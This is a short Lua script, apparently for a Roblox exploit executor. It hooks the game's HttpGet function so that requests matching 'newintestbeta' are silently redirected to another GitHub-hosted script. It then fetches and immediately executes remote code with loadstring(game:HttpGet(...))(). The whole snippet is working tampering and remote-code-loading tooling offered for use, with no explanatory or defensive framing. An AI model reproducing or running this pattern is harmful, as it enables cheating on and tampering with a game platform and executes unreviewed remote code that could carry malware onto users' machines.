...
local oldHttp; oldHttp = hookfunction(game.HttpGet, function(self, url)
	...
	if url:match("newintestbeta") then
		...
		url = "https://raw.githubusercontent.com/singlebladez/pew/blob/main/dompa.lua"
	end
  	return oldHttp(self, url)
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/singlebladez/pew/blob/main/lompa.lua"))()
